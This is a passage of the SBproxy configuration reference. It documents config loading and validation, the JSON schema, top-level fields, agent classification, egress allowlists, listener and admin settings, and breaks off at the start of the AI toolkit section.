# SBproxy Configuration Reference

*Last modified: 2026-08-28*

The complete configuration reference for SBproxy: every option, every field, every action type. Most snippets below are deliberately partial, a skeleton showing which keys nest where or one field in isolation, so they read fast but are not meant to be saved as-is and booted. For a config you can actually run, start from [`examples/`](../examples/) (one runnable `sb.yml` per feature) or a [use-case guide](README.md#solve-a-problem) that walks a complete file end to end; this page is where you look up a field once you know which one you need.

For AI-specific features in depth, see [ai-gateway.md](ai-gateway.md). For CEL, Lua, JavaScript, and WASM scripting, see [scripting.md](scripting.md). For the event system, see [events.md](events.md).

## Table of contents

1. [Overview](#overview)
2. [JSON Schema (editor autocomplete + validation)](#json-schema-editor-autocomplete--validation)
3. [Top-level structure](#top-level-structure)
4. [Proxy settings](#proxy-settings)
5. [Tenants](#tenants)
6. [Origins](#origins)
7. [Actions](#actions)
8. [Authentication](#authentication)
9. [Policies](#policies)
10. [Transforms](#transforms)
11. [Request modifiers](#request-modifiers)
12. [Response modifiers](#response-modifiers)
13. [Response cache](#response-cache)
14. [Forward rules](#forward-rules)
15. [Fallback origin](#fallback-origin)
16. [Variables, vaults, and secrets](#variables-vaults-and-secrets)
17. [Session config](#session-config)
18. [Compression](#compression)
19. [HSTS](#hsts)
20. [Connection pool](#connection-pool)
21. [Upstream timeouts](#upstream-timeouts)
22. [Bot detection](#bot-detection)
23. [Threat protection](#threat-protection)
24. [Error pages](#error-pages)
25. [Problem details (RFC 9457)](#problem-details-rfc-9457)
26. [Idempotency](#idempotency)
27. [Rate limit headers](#rate-limit-headers)
28. [Message signatures](#message-signatures)
29. [Traffic capture](#traffic-capture)
30. [Host header semantics](#host-header-semantics)
31. [Origin overrides](#origin-overrides)
32. [Trusted proxies and forwarding headers](#trusted-proxies-and-forwarding-headers)
33. [Request mirror](#request-mirror)
34. [Upstream retries](#upstream-retries)
35. [Active health checks](#active-health-checks)
36. [Circuit breaker](#circuit-breaker)
37. [Outlier detection](#outlier-detection)
38. [Service discovery](#service-discovery)
39. [Correlation ID](#correlation-id)
40. [mTLS client authentication](#mtls-client-authentication)
41. [Webhook envelope and signing](#webhook-envelope-and-signing)
42. [Secrets](#secrets)
43. [Environment variables](#environment-variables)
44. [ACME / auto TLS](#acme--auto-tls)
45. [Redis integration](#redis-integration)
46. [Config source (GitOps)](#config-source-gitops)
47. [Config authority](#config-authority-fleet-configuration-distribution)
48. [Project-owned origin profiles](#project-owned-origin-profiles)
49. [Validation](#validation)
50. [CORS](#cors)
51. [Quick reference: config field locations](#quick-reference-config-field-locations)
52. [Environment variable templating in header modifiers](#environment-variable-templating-in-header-modifiers)

---

## Overview

SBproxy reads its configuration from a YAML file, typically named `sb.yml`. This file defines how the proxy listens for traffic, which hostnames it handles, and what it does with each request.

Load a config file. The path must be supplied explicitly; the binary does not auto-discover `sb.yml` in the current directory.

```bash
# Explicit path
sbproxy --config /etc/sbproxy/production.yml

# Same thing via the `serve` subcommand and the short flag
sbproxy serve -f /etc/sbproxy/production.yml

# Or via env var for containerised deployments
SB_CONFIG_FILE=/etc/sbproxy/production.yml sbproxy
```

Validate without starting:

```bash
sbproxy validate /etc/sbproxy/production.yml
# or
sbproxy --config /etc/sbproxy/production.yml --check
```

The config has two main sections: `proxy` (server-level settings) and `origins`
(per-hostname routing and behavior). The optional shared-state block
`l2_cache_settings` and the process-owned `compression_state` block live
nested under `proxy`.

Unknown keys are rejected. A misspelled key anywhere inside `proxy` or an
origin (`force_ssl` typed as `forced_ssl`, `mtls` as `mtsl`, a stray field in
a `credentials` policy) fails `serve`, `validate`, and hot reload with an
error naming the key and the accepted alternatives, instead of being silently
dropped while the setting takes its default. Two escape hatches stay open:
out-of-tree blocks belong under `proxy.extensions:` (or an origin's
`extensions:`), which accept arbitrary keys, and unknown keys at the very top
level of the file only log a warning so flat schema-v1 configs from the
archived Go line keep loading.

The smallest runnable file is synced from
[`examples/basic-proxy/sb.yml`](../examples/basic-proxy/sb.yml). CI compiles
that canonical example and rejects this block if the two drift.

<!-- sbproxy-config: examples/basic-proxy/sb.yml -->
```yaml
proxy:
  http_bind_port: 8080

origins:
  "myapp.example.com":
    action:
      type: proxy
      url: https://test.sbproxy.dev
```

---

## JSON Schema (editor autocomplete + validation)

SBproxy ships a generated JSON Schema at `schemas/sb-config.schema.json`.
Editor tooling that understands the `yaml-language-server` directive (VS Code
with the YAML extension, IntelliJ / JetBrains, Helix) uses it for autocomplete,
typed fields, and closed-enum hints.

Opt in by adding a comment header at the top of your `sb.yml`:

```yaml
# yaml-language-server: $schema=https://raw.githubusercontent.com/soapbucket/sbproxy/main/schemas/sb-config.schema.json
proxy:
  http_bind_port: 8080
origins:
  "api.example.com":
    action: { type: proxy, url: http://127.0.0.1:9000 }
```

Every `examples/*/sb.yml` in this repo carries the header pointing at the local `schemas/` path so the examples are self-validating against the same schema operators consume.

The schema describes the typed configuration envelope generated from
`crates/sbproxy-config/src/types.rs`. Module payloads stay opaque at this
layer: `action`, `authentication`, each `policies[]` entry, and each
`transforms[]` entry are parsed by their runtime constructors after the
envelope loads. Envelope objects are closed (`additionalProperties: false`),
matching the runtime's unknown-key rejection, but serde aliases such as
`auth` and `session_config` do not appear as separate schema properties, so
an editor may flag an alias the proxy accepts. Module payloads and aliases
are the boundaries an editor cannot check.

Run `sbproxy validate <path>` for the authoritative check. It loads the same
configuration and constructs the same runtime modules as `serve`, then throws
them away.

What it deliberately does not do is anything `serve` would leave behind.
Validation opens no listener, resolves no secret reference, opens no key
store and no receipt ledger, dials neither Redis nor the mesh for a semantic
cache, and creates no state directory: every module that would reach the
filesystem or the network at boot is constructed in a validation mode that
stubs that part out. So running it against a candidate file on a host that is
already serving traffic cannot change what that proxy is doing.

What it does read is the process environment and the local files the document
points at. A `${VAR}` is interpolated before the YAML is parsed, and material
such as a Redis client certificate or a config-authority signing key is read
from disk to check it is usable. Two validate runs of the same file agree
unless one of those inputs changed between them, which is also why a run on a
laptop and a boot on a server can legitimately disagree.

Regenerate the schema locally with:

```bash
cargo run -p sbproxy-config --bin generate-schema > schemas/sb-config.schema.json
```

The CI gate `scripts/check-config-schema.sh` runs the generator and `diff`s against the committed file; a Rust type change that does not regenerate the schema is rejected at PR time. The generator is deterministic (the `preserve_order` feature on `schemars` keeps object property order stable), so the diff is byte-for-byte.

---

## Top-level structure

**Map, not a config.** Every `{ ... }` and `[ ... ]` below is a placeholder for a real block documented in its own section, not literal YAML. This shows which keys nest where; it does not validate or run. For a complete file, see [`examples/basic-proxy/sb.yml`](../examples/basic-proxy/sb.yml) for the smallest real one, or any [`examples/<name>/sb.yml`](../examples/) for a feature-specific full config.

<!-- sbproxy-config-excerpt -->
```yaml
# Optional external source descriptor
source: { ... }

# Server settings (ports, TLS, ACME, admin, secrets, shared state)
proxy:
  http_bind_port: 8080
  https_bind_port: 8443
  tls_cert_file: /etc/sbproxy/cert.pem
  tls_key_file: /etc/sbproxy/key.pem
  acme: { ... }
  http3: { ... }
  metrics: { ... }
  alerting: { ... }
  admin: { ... }
  secrets: { ... }
  cluster: { ... }
  model_host: { ... }
  config_authority: { ... }
  observability: { ... }
  scripting: { ... }
  key_management: { ... }
  cache_reserve: { ... }
  federation: { ... }
  tenants: [ ... ]
  credentials: [ ... ]

  # L2 cache (Redis) for distributed rate limiting and caching
  l2_cache_settings:
    driver: redis
    params:
      dsn: redis://localhost:6379/0

  # Opaque per-server extensions consumed by out-of-tree crates.
  extensions: { ... }

# Agent classification catalog and resolver tuning
agent_classes:
  catalog: builtin
  resolver:
    rdns_enabled: true
    bot_auth_keyid_enabled: true
    cache_size: 10000

# Optional process-wide blocks
access_log: { ... }
rate_limits: { ... }
audit: { ... }
egress: { ... }
session_ledger: { ... }
request_events: { ... }
events: { ... }
flags: [ ... ]
update: { ... }

# Project-owned origin profiles: the floor every composed origin starts
# from, and which project repositories to pull
origin_defaults: { ... }
origin_sources: { ... }

# Per-hostname origin configurations
origins:
  "api.example.com":
    action: { ... }
    authentication: { ... }
    policies: [ ... ]
    transforms: [ ... ]
    request_modifiers: [ ... ]
    response_modifiers: [ ... ]
    forward_rules: [ ... ]
    response_cache: { ... }
    variables: { ... }
    session: { ... }
    cors: { ... }
    compression: { ... }
    hsts: { ... }
    extensions: { ... }
```

`l2_cache_settings` is nested under `proxy:` (the deserializer also accepts `l2_cache` as a canonical alias).

### Top-level fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `source` | object | unset | Optional local or Git configuration source descriptor. |
| `proxy` | object | defaults | Server-wide listener, security, state, and operations settings. |
| `origins` | map | `{}` | Hostname-keyed request pipelines. |
| `access_log` | object | unset | Structured JSON access-log configuration. |
| `agent_classes` | object | unset | Agent catalog selection and resolver tuning. |
| `rate_limits` | object | unset | Workspace-wide budget and auto-suspend state. Separate from per-origin policies. |
| `audit` | object | unset | Admin-action and security/config/key audit trail. `sink: memory` (default) keeps rows in an in-memory ring and on the `tracing` targets; `sink: chain` additionally hash-chains and Ed25519-signs `security_audit` (plus `config_audit`/`key_audit`/admin-action rows when `config_path`/`key_path`/`admin_path` are set) to a durable file `sbproxy audit verify` can check. See [audit-log.md](audit-log.md). |
| `egress` | object | unset | Per-purpose outbound allowlists (AI providers, agent orchestration, classifier hooks, usage sinks, model artifacts, token exchange, telemetry). See [Egress allowlists](#egress-allowlists). |
| `session_ledger` | object | unset | MCP tool-call session-ledger emission. |
| `request_events` | object | unset | Where completed request events go: `none` (default), `logging`, `file`, `nats`, or `clickhouse`. See [request_events](#request_events) and [Request-event egress](observability.md#request-event-egress). |
| `events` | object | unset | Where typed lifecycle events go: `none` (default), `file`, or `webhook`. Delivery is off the request path through a bounded queue. See [events.md](events.md). |
| `flags` | list | `[]` | Process-wide feature flags exposed to CEL. |
| `update` | object | stable channel, automatic checks off | Binary and managed-engine update policy: `channel`, `auto` (background freshness check, reports only, never replaces an artifact), `check_interval_secs` (default 1 day). See [manual.md](manual.md#update---keep-the-binary-engines-and-models-current) for the full field reference and the `sbproxy update` CLI. |

### Agent classes

The optional top-level `agent_classes` block configures the process-wide agent identity resolver. Omitting it uses the embedded catalog and default resolver tuning.

```yaml
agent_classes:
  catalog: inline
  entries:
    - id: openai-gptbot
      vendor: OpenAI
      purpose: training
      expected_user_agent_pattern: "(?i)\\bGPTBot/\\d"
      expected_reverse_dns_suffixes: [".gptbot.openai.com"]
      expected_keyids: ["openai-2026-01"]
  resolver:
    rdns_enabled: true
    bot_auth_keyid_enabled: true
    cache_size: 10000
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `catalog` | string | `builtin` | `builtin` loads the embedded catalog. `inline` loads `entries`. `hosted-feed` and `merged` are reserved for the registry fetcher and currently fall back to builtin. |
| `entries` | list | `[]` | Complete inline catalog used when `catalog: inline`. Entries use `id`, `vendor`, `purpose`, `expected_user_agent_pattern`, optional `expected_reverse_dns_suffixes`, and optional `expected_keyids`. |
| `entries[].expected_user_agent_pattern` | string | required | Regex compiled exactly as written and searched for anywhere in the `User-Agent` header. Write the `(?i)` yourself: without it the match is case-sensitive and the entry silently never fires, which the proxy warns about once per entry at load. Write your own boundary too, because an unanchored bare literal also matches a header that merely contains it: prefer `(?i)\\bMyBot/\\d` over `MyBot`. |
| `resolver.rdns_enabled` | bool | `true` | Run forward-confirmed reverse DNS as resolver step 2. |
| `resolver.bot_auth_keyid_enabled` | bool | `true` | Let a verified Web Bot Auth `keyid` match `expected_keyids` as resolver step 1. |
| `resolver.cache_size` | int | `10000` | Per-process reverse-DNS verdict cache capacity. |

Step 2 queries a reverse zone the client controls, so it runs under fixed
bounds rather than operator-set ones:

- At most four PTR names per address are forward-confirmed. A zone that
  answers with more is not verified further.
- Each DNS query is capped at two seconds. The forward-confirm loop
  stops issuing new lookups once two seconds of it have elapsed, so a
  whole verification, PTR query included, costs at most about six
  seconds of wall clock.
- At most 32 of these queries are in flight process-wide. Past that a
  lookup is refused rather than queued, because a queued one still holds
  the thread waiting on it.
- Verdicts are cached per client IP, up to `cache_size` addresses: 300
  seconds for a resolved verdict, 30 seconds for a DNS failure, so an
  address with no PTR record costs one lookup per 30 seconds rather than
  one per request.
- The lookup runs on the blocking pool, never on the async worker
  handling the request, and only on a request that actually needs it.

A client that fails or exceeds any of these is not classified by rDNS;
resolution falls through to the User-Agent pass, exactly as it does for
an unreachable resolver. Set `resolver.rdns_enabled: false` to skip step
2 entirely.

### Egress allowlists

The optional top-level `egress` block arms per-purpose outbound
allowlists. Each sub-block is independently
optional; a purpose whose sub-block is omitted, or whose `mode` is left
at the default `allow_by_default`, stays legacy ungated exactly as if
`egress:` were absent entirely. Set `mode: deny_by_default` to actually
arm a purpose: only the hosts listed may be reached, and every
destination that purpose touches lands in the egress inventory (`GET
/api/egress`, see [admin-api-reference.md](admin-api-reference.md)) as
`allowed` or `denied` instead of `ungated`.

```yaml
egress:
  ai_providers:
    mode: deny_by_default
    hosts: ["api.openai.com", "api.anthropic.com"]
  agent_orchestration:
    mode: deny_by_default
    hosts: ["agents.internal"]
    ports: [443]
  classifier_hooks:
    mode: deny_by_default
    hosts: ["classifier.internal"]
    ports: [50051]
    allow_private: true
  usage_sinks:
    mode: deny_by_default
    hosts: ["cloud.langfuse.com"]
  model_artifacts: { ... }
  token_exchange: { ... }
  federation:
    mode: deny_by_default
    hosts: ["anchor.example", "intermediate.example"]
  telemetry:
    mode: deny_by_default
    hosts: ["otel-collector.internal"]
    ports: [4317]
    allow_private: true
```

| Sub-block | Purpose(s) armed | Gates |
|---|---|---|
| `ai_providers` | `ai_provider` | Every upstream AI provider dispatch the AI gateway client makes. |
| `agent_orchestration` | `agent_orchestration` | Every outbound invocation made by a configured `proxy.ai_toolkit` workflow. Configured agents require this block with `mode: deny_by_default`; omission does not create an ungated compatibility path for them. |
| `classifier_hooks` | `classifier_hook` | Stock intent-classification and prompt-aware provider-quality gRPC calls. The two hooks share this one purpose-scoped gate. Nonlocal `proxy.classifier_hooks.endpoint` destinations must already be `https://` and authenticated with bearer metadata, client mTLS, or both; see [intent-detection.md](intent-detection.md). |
| `usage_sinks` | `usage_sink`, `webhook` | Langfuse, Datadog, and object-store usage-sink deliveries (`usage_sink`), plus webhook usage-sink deliveries and the `events:` webhook sink (`webhook`, a separate purpose the same sub-block arms with one allowlist). |
| `model_artifacts` | `model_artifact` | The model-host artifact fetcher's HTTP downloads. |
| `token_exchange` | `token_exchange` | Every OAuth token-endpoint call this proxy makes: the non-MCP outbound-credential resolver's, and the MCP run-as-user token exchange's. A per-server `egress:` block gates that server's upstream connects and OpenAPI tool calls; it does not reach this purpose, so this sub-block is the only way to arm a token endpoint. |
| `federation` | `federation` | The OpenID Federation fetcher's entity-configuration and subordinate-statement GETs. Reached only when `proxy.federation.peer_trust` is configured: a proxy that publishes its own entity statement and verifies nobody makes no federation fetch at all, so the purpose reports armed with zero sightings and that is the correct reading, not a broken control. This is also the one sub-block whose absence does not leave the purpose unguarded: a peer URL that resolves to a private, loopback, or link-local address is refused before any connect either way, and the dial is pinned to the addresses that check resolved. What the block adds is the host, scheme, and port allowlist, which is what stops a peer discovered through the chain from being dialed at all unless an operator named it. See [federation.md](federation.md). |
| `telemetry` | `telemetry` | The OTLP trace, metric, and log exporter endpoints. Authorized once at boot, where each exporter is constructed; a denied endpoint refuses boot with a fatal error naming it. A config reload re-verifies the still-running trace and metric exporters against the new allowlist and refuses the reload, naming the endpoint, if either is now denied; the log exporter is rebuilt on every reload and re-authorizes itself then. |

Each sub-block accepts `mode` (`deny_by_default` or `allow_by_default`,
default `allow_by_default`), `hosts` (exact hostnames, case-insensitive),
`ports` (default `[80, 443]`; **`telemetry` almost always needs an
explicit override**, since the OTLP default endpoint is `4327` and the
common alternates are `4317`/`4318`, none of them `80` or `443`; an
empty list or port `0` fails config compile), and `allow_private`
(permit resolved private/link-local addresses for listed hosts; default
`false`). Unlike the per-tool MCP/OpenAPI `egress:` block, this section
has no `suffixes` key.

---

## Proxy settings

The `proxy` block configures server-level behavior: ports, TLS, ACME, the admin API, metrics, secrets, and the optional shared-state backends.

```yaml
proxy:
  http_bind_port: 8080
  https_bind_port: 8443
  tls_cert_file: /etc/sbproxy/cert.pem
  tls_key_file: /etc/sbproxy/key.pem

  acme:
    enabled: true
    email: admin@example.com
    storage_path: /var/lib/sbproxy/certs

  http3:
    enabled: false

  metrics:
    max_cardinality_per_label: 1000
    cardinality:
      hostname_cap: 200

  admin:
    enabled: false
    port: 9090
```

### Proxy fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `http_bind_port` | int | 8080 | HTTP listen port |
| `bind_address` | string | `0.0.0.0` | Address the public HTTP and HTTPS listeners bind. See [Choosing a bind address](#choosing-a-bind-address). |
| `http2_cleartext` | bool | false | Enable h2c on the plain HTTP listener for plaintext HTTP/2 and gRPC clients. |
| `https_bind_port` | int | unset | Optional HTTPS listen port. Requires `tls_cert_file` + `tls_key_file` or an `acme` block. |
| `tls_cert_file` | string | | Path to PEM-encoded TLS certificate. Ignored when `acme` is configured. |
| `tls_key_file` | string | | Path to PEM-encoded TLS private key. |
| `acme` | object | | ACME (auto-TLS) block. Overrides manual cert/key when set. See [ACME / auto TLS](#acme--auto-tls). |
| `http3` | object | | Reserved HTTP/3 (QUIC) listener config. Enabling it is rejected; see [HTTP/3 fields](#http3-fields). |
| `metrics` | object | | Metrics tuning, including label cardinality limits. |
| `observability` | object | | Log sinks, redaction, custom fields, OTLP export, and usage rollups, plus the process logger's `log.level` and `log.format`. Those two sit below `--log-level`/`SB_LOG_LEVEL`, `RUST_LOG`, and `--log-format`/`SB_LOG_FORMAT`; see [observability.md](observability.md). `log.sampling` is config-only and drops nothing. |
| `alerting` | object | | Alert notification channels. |
| `admin` | object | | Embedded authenticated admin API and UI. |
| `ai_toolkit` | object | unset | Bounded, generation-pinned agents, workflows, immutable evaluation datasets, and weighted prompt rollouts. See [AI toolkit fields](#ai-toolkit-fields). |
| `secrets` | object | | Secrets management backend. See [Secrets](#secrets). |
| `cluster` | object | unset | Canonical local or distributed cluster identity, membership, mTLS, enrollment, snapshot, and signed deployment-authority settings. |
| `model_host` | object | unset | Canonical managed-model authority, cache, engines, deployments, placement, and rollout policy. |
| `config_authority` | object | unset | Subscribe to or publish signed configuration bundles. |
| `key_management` | object | unset | Mutable key store, policy cache, encryption, claim mapping, declarative seed, read audit, and break-glass access. See [Key management crypto, audit, and break-glass fields](#key-management-crypto-audit-and-break-glass-fields). |
| `agent_registry` | object | unset | Signed agent-catalog subscriber plus the owner-approval queue for agent self-registration, over one embedded store. Boot-only. See [Agent registry fields](#agent-registry-fields). |
| `notifications` | object | unset | Outbound webhook subscriptions with per-destination filters, signing keys, retries, and a durable deadletter queue. Boot-only. See [Notification fields](#notification-fields). |
| `l2_cache_settings` | object | | Optional shared-state backend. Alias: `l2_cache`. |
| `anomaly` | object | unset | Behavioral anomaly detection over the TLS fingerprint, resolver source, headless-library signal, and per-address rate, plus the per-agent-class reputation score it feeds and the optional admission thresholds that read it. Disabled by default. See [anomaly-detection.md](anomaly-detection.md). |
| `cache_reserve` | object | unset | Optional cold-tier response cache backed by memory, filesystem, Redis, or object storage (S3, GCS, Azure Blob, a local directory, or any S3-compatible store) with optional at-rest sealing. The separate `type: s3` backend is retired and refused at config load; see [cache-reserve.md](cache-reserve.md). |
| `compression_state` | object | unset | Process-owned Local AI summary-state path. See [compression_state](#compression_state). |
| `config_history` | object | unset | Durable local ring of every applied config revision, kept for inspection and future rollback. Disabled by default. See [config_history](#config_history). |
| `response_cache_store` | object | unset | Picks the backing store for the shared response cache and optionally encrypts entries at rest. See [Choosing the backing store](#choosing-the-backing-store). When unset, the store is Redis if `l2_cache_settings` is configured and an in-process map otherwise. |
| `messenger_settings` | object | | Not supported. Setting it fails config load. See [messenger_settings](#messenger_settings). |
| `zone` | string | unset | The availability zone this proxy considers itself in, e.g. `us-east-1a`. Load balancer targets labeled with a matching `targets[].zone` are preferred; see [Zone-aware routing](routing.md#distributing-traffic-the-load-balancer-action). When unset, the `SB_ZONE` environment variable fills in (config wins). Unset both and selection ignores zone labels entirely. |
| `trusted_proxies` | array of CIDR strings | `[]` | Source ranges whose inbound `X-Forwarded-For` / `X-Real-IP` / `Forwarded` headers are honored. Connections from outside the list have those headers stripped on ingress so they cannot spoof identity. IPv6 CIDRs work. See [Trusted proxies and forwarding headers](#trusted-proxies-and-forwarding-headers). |
| `correlation_id` | object | enabled, `X-Request-Id`, echo on | Correlation-ID propagation policy. See [Correlation ID](#correlation-id). |
| `mtls` | object | unset | mTLS client-certificate verification on the HTTPS listener. See [mTLS client authentication](#mtls-client-authentication). |
| `ai_providers_file` | string | unset | Override the embedded AI provider catalog at startup. |
| `device_parser_file` | string | unset | Not supported. Setting it fails config load; the device parser matches on compiled-in rules and opens no catalog file. |
| `synthetic_probe` | object | unset | Optional in-process transaction probe reported through readiness. |
| `scripting` | object | defaults | Scripting runtime limits. The `lua.sandbox` and `javascript.sandbox` sub-blocks are both live and both reload without a restart. See [scripting.md](scripting.md). |
| `http_client_timeouts` | object | (see below) | Tunable timeouts for the proxy's outbound HTTP helpers (forward-auth, callbacks, mirrors, SWR refreshes, bot-auth directory). See [HTTP client timeouts](#http-client-timeouts). |
| `web_bot_auth` | object | unset | Process-wide Ed25519 identity for outbound Web Bot Auth signing and public-key discovery. |
| `tenants` | list | `[]` | Declared tenants referenced by `origins.*.tenant_id`. |
| `credentials` | list | `[]` | Proxy-scope credentials inherited by tenant and origin scopes. |
| `extensions` | object | | Opaque map for out-of-tree top-level config blocks. The proxy never parses them. |
| `payments` | object | unset | Durable settlement for paid requests: SQLite intent/attempt/proof/receipt store, challenge binding key, authorization timeout, and the infra-failure posture. Absent keeps every payment provider config-only. See [payments.md](payments.md#getting-paid-proxypayments). |
| `federation` | object | unset | OpenID Federation identity this proxy publishes at `/.well-known/openid-federation`, and the pinned anchors it verifies a peer against. `peer_trust` runs a chain walk on the request path, so its `max_chain_fetches`, `max_chain_bytes`, `max_chain_duration_ms`, `max_authority_hints`, and `walks_per_minute` keys are what bound the outbound requests one unauthenticated caller can cause; `max_chain_depth` is a depth cap and not one of them. See [federation.md](federation.md#configuring-proxyfederation). |
| `attestation` | object | unset | Receipt attestation for this node: whether it writes signed, hash-chained receipts, and its failure/enforcement posture. `role: claim` and `role: both` are refused at load because the claim half is not implemented, so an origin may narrow `role` but not widen it into that half. Backs the `/api/meter/*` operator surface. See [metering.md](metering.md#configuration). |

### Choosing a bind address

`bind_address` is the network interface the public listeners answer on. It applies to `http_bind_port` and `https_bind_port` together, on purpose: two separate fields would let you lock down HTTP, leave HTTPS on every interface, and believe the box was closed.

```yaml
proxy:
  http_bind_port: 8080
  bind_address: 0.0.0.0     # default: every interface
```

| Value | Who can reach the listener |
|-------|---------------------------|
| `0.0.0.0` | Anything that can route to this host, on any interface. The default, because a reverse proxy is usually deployed to be reached. |
| `127.0.0.1` | Only processes on this machine. |
| `10.0.1.5` | Only traffic arriving on that interface. |
| `::1`, or any IPv6 literal | The IPv6 equivalents. |

The value must be an IP literal. Hostnames are refused at config load, because a name can resolve to several addresses or to a different one after a DNS change, and a listener that quietly moves between interfaces is not one you can reason about.

A malformed address is also refused at config load rather than warned past. That is deliberate: the failure worth preventing is an operator restricting the listener, mistyping it, and getting every interface while believing otherwise. There is no safe direction to guess in.

**This is reach, not authorization.** Binding loopback limits who can open a connection. It does not authenticate anyone who can. An origin exposed on a shared host is still exposed to every process on it, and `origins:` hostname matching is not a substitute either, since the `Host` header is set by the caller.

`sbproxy run` and `sbproxy service install` generate `bind_address: 127.0.0.1`. Those commands configure one machine to serve itself, their generated `origins:` map is keyed on loopback names, and the URL they print at startup is a loopback URL. Binding every interface there would publish an unauthenticated model gateway to the network while telling you it was local. To serve other machines, write a config and set `bind_address` yourself, which makes it a decision rather than a default.

### HTTP client timeouts

The proxy keeps a small set of pooled `reqwest::Client` instances for its outbound helper requests. Each one used to bake a hardcoded timeout into the binary; operators who wanted a slower forward-auth deadline or a shorter callback budget had to fork the binary. The `http_client_timeouts` block exposes those numbers as config keys.

All fields default to the values the binary used before this block existed, so omitting it leaves behavior unchanged.

```yaml
proxy:
  http_client_timeouts:
    forward_auth_client_secs: 30
    forward_auth_request_secs: 5
    bot_auth_directory_client_secs: 5
    swr_client_secs: 30
    callback_client_secs: 10
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `forward_auth_client_secs` | int | 30 | Outer client-level timeout for the shared forward-auth client. The per-provider `forward_auth.timeout` field still applies on top. |
| `forward_auth_request_secs` | int | 5 | Per-request fallback timeout for a forward-auth subrequest when the provider's own `timeout` field is unset. |
| `bot_auth_directory_client_secs` | int | 5 | Client-level timeout for the Web Bot Auth directory lookup client. |
| `swr_client_secs` | int | 30 | Client-level timeout for the stale-while-revalidate background refresh client. |
| `callback_client_secs` | int | 10 | Client-level timeout for the callback / webhook client used by fire-and-forget POSTs. |

### HTTP/3 fields

HTTP/3 is not served by this build. The `http3` shape is retained for forward compatibility: omitting the block or setting `enabled: false` compiles, while `enabled: true` fails config compilation with an actionable error. The remaining fields are reserved and have no runtime effect while the block is disabled.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | false | Reserved activation flag. Must remain false in this build. |
| `max_streams` | int | 100 | Reserved maximum concurrent QUIC streams per connection. |
| `idle_timeout_secs` | int | 30 | Reserved idle timeout for QUIC connections. |

### Admin fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | false | Enable the admin server |
| `port` | int | 9090 | Listen port |
| `username` | string | "admin" | Top-level admin HTTP Basic username |
| `password` | string | "changeme" | Top-level admin HTTP Basic password. The default is rejected when the surface is reachable off loopback (see below) |
| `max_log_entries` | int | 1000 | Recent-request log buffer size; the routing-decisions ring shares this cap |
| `rate_limit_per_minute` | int | 240 | Admin API requests allowed per client IP per minute; the global cap across all clients is ten times this value. Valid range 1 to 100000; 0 is rejected because the limiter cannot be turned off |
| `bind` | string | "127.0.0.1" | Bind address; set to `0.0.0.0` or an interface for remote admin. Must be an IP address literal; a value that does not parse is a validation error, not a silent fall back to loopback |
| `allow_ips` | list | empty | IP / CIDR allowlist; empty keeps the loopback-only default (an empty list denies every non-loopback peer, it does not permit all) |
| `cors_origins` | list | empty | Allowed CORS origins for a separately hosted UI |
| `operators` | list | empty | Login identities with roles: `{username, password, role}` where `role` is `admin` or `read_only` |
| `tls` | object | unset | `{cert, key}` PEM paths; serve HTTPS instead of plaintext |
| `prompt_persistence_path` | string | unset | redb file persisting prompt-version edits across restarts |
| `prompt_persistence_encryption` | object | unset | Seals the records in `prompt_persistence_path` at rest with AES-256-GCM. See [Encrypting persisted prompts at rest](#encrypting-persisted-prompts-at-rest). Unset stores them as plaintext JSON. |

When enabled, the admin server binds `bind:<port>` (loopback by
default), authenticates every request (HTTP Basic or a browser session),
enforces the operator's role on mutations, and applies a per-client-IP
rate limit of `rate_limit_per_minute` requests per minute (default 240),
with a global cap across all clients of ten times that value.

The default credentials (`admin` / `changeme`) are fine on the loopback
default and refused once the admin surface is reachable from another
host, which means either `bind` is not a loopback address or `allow_ips`
contains an entry outside loopback. `sbproxy validate` fails with the
condition that tripped named; set a real password, or keep the admin
server on loopback. Changes under `proxy.admin` need a restart rather
than a reload, because the admin server reads its config once at
startup. Full auth, RBAC, remote-access, and endpoint reference is in
[admin.md](admin.md). Endpoints (abbreviated):

| Path | Description |
|------|-------------|
| `GET /api/health` | Liveness check returning `{"status":"ok"}`. |
| `GET /api/openapi.json` | Emitted OpenAPI 3.0 document for the running pipeline. |
| `GET /api/openapi.yaml` | Same document in YAML. |
| `POST /admin/reload` | Re-read the on-disk config file and hot-swap the pipeline. Single-flight; concurrent calls return 409. |
| `GET /admin/drift` | Compare the on-disk config file against the loaded baseline. See below. |

Unauthenticated requests get a 401. For a script that 401 carries the
RFC 7235 challenge, `WWW-Authenticate: Basic realm="sbproxy admin"`. For
a browser it does not, so the console's own sign-in page is what asks
for credentials rather than the browser's native dialog; the two markers
that identify a browser, and what a browser sees instead, are in
[admin-api-guide.md](admin-api-guide.md#what-a-refused-request-gets-back).

A peer outside `allow_ips` is refused before a single request byte is
read, with a 403 and `{"error":"Forbidden"}`. With `allow_ips` unset,
and with an entry that parses as neither an address nor a CIDR, the
allowlist is loopback only.

#### `GET /admin/drift`

Returns whether the on-disk config file has diverged from what the
running proxy has loaded, without triggering a reload. K8s
operators and dashboards scrape this so they can flag a config that
was edited on disk but not yet hot-reloaded.

Response shape (200 OK):

```json
{
  "config_path": "/etc/sbproxy/sb.yml",
  "loaded_revision": "a3f5b1d829c4",
  "loaded_content_hash": "8e1c5d4a9f7b",
  "on_disk_content_hash": "8e1c5d4a9f7b",
  "drift": false,
  "on_disk_size_bytes": 4321,
  "checked_at": "2026-05-06T15:42:00Z"
}
```

* `loaded_revision` is the 12-char origin-set identity hash from the
  running pipeline. Stable when only policies, transforms, or ports
  change; moves when origins or hostnames are added or removed.
* `loaded_content_hash` is the 12-char SHA-256 prefix of the raw YAML
  bytes captured at load time (startup or last successful
  `/admin/reload`).
* `on_disk_content_hash` is the same hash recomputed against the
  current file contents.
* `drift` is `true` iff the two content hashes differ.

Failure modes:

* `503` - the admin server has no on-disk config path (constructed
  without `with_config_path`, e.g. tests), or no content-hash
  baseline has been captured yet (no startup load and no successful
  reload).
* `500` - the on-disk file could not be read. The error message has
  the absolute path scrubbed so the response does not leak the
  operator's filesystem layout.
* `405` - any verb other than `GET`.

### AI toolkit fields

`proxy.ai_toolkit` publishes bounded agent, workflow, evaluation, and prompt
rollout state with the same immutable generation as the origins it references.
Omitting the block creates an empty runtime. It does not require Redis.

```yaml
proxy:
  ai_toolkit:
    limits:
      max_agents: 64
      max_workflows: 64
      agent_concurrency: 8
